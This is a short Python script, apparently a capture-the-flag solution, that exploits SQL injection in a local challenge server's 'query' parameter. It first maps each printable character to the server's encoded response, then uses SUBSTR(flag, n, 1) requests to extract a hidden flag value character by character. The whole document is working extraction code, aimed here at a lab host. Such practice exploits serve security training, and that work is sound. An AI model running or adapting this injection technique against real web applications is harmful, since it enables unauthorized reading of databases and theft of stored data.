import requests


BASE_URL = "http://challenge.localhost:80/?query=SUBSTR('{}',1,1)"

ascii_encryption_mapping = {}


def retrieve_encryption_from_response(res):
    enc = ""
    split_res = res.split("<pre>")
    flag_res = split_res[1]
    for char in flag_res:
        if char != "<":
            enc += char
        else:
            break
    return enc


def get_flag():
    for i in range(33, 126):
        char = chr(i)
        try:
            res = requests.get(BASE_URL.format(char))
            encryption = retrieve_encryption_from_response(res.text)
            ascii_encryption_mapping[encryption] = char
        except Exception as e:
            print("exception above:", e)

    print(ascii_encryption_mapping)
    idx = 1
    flag_url = "http://challenge.localhost:80/?query=SUBSTR(flag,{},1)"

    flag = ""
    while True:
        try:
            res = requests.get(flag_url.format(idx))
            encryption = retrieve_encryption_from_response(res.text)
            flag += ascii_encryption_mapping[encryption]

            idx += 1
        except Exception as e:
            print("Exception in getting flag", e)
            break

    print("flag:: ", flag)


if __name__ == "__main__":
    get_flag()
